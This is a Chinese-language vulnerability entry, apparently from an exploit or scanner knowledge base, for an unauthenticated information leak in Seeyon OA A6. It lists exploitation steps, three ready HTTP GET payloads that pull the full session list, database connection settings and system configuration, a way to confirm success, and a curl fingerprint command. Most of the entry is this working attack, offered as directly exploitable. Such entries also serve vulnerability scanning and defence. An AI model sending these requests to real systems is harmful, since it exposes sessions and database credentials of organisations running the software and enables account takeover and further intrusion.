---
id: SEEYON-A6-INFO-LEAK
title: 致远OA A6 信息泄露（数据库配置/Session）
product: seeyon-oa
vendor: 北京致远互联
version_affected: "A6"
severity: HIGH
tags: [info_leak, 无需认证, 国产, oa]
fingerprint: ["致远", "Seeyon", "yyoa", "getSessionList", "createMysql"]
---

## 漏洞描述

致远OA A6 多个接口可未授权访问，泄露数据库配置、Session 列表等敏感信息。

## 影响版本

- A6

## 前置条件

- 无需认证，可直接利用
- 目标为致远OA A6 版本

## 利用步骤

1. 访问 `/yyoa/ext/https/getSessionList.jsp?cmd=getAll` 获取全部 Session 列表
2. 访问 `/yyoa/createMysql.jsp` 获取数据库连接配置
3. 访问 `/yyoa/ext/https/config.jsp` 获取系统配置信息

## Payload

```http
GET /yyoa/ext/https/getSessionList.jsp?cmd=getAll HTTP/1.1
Host: target
```

```http
GET /yyoa/createMysql.jsp HTTP/1.1
Host: target
```

```http
GET /yyoa/ext/https/config.jsp HTTP/1.1
Host: target
```

## 验证方法

响应中包含 session 列表或数据库配置信息。

## 指纹确认

```bash
curl -s -o /dev/null -w "%{http_code}" "http://target/yyoa/ext/https/getSessionList.jsp"
```
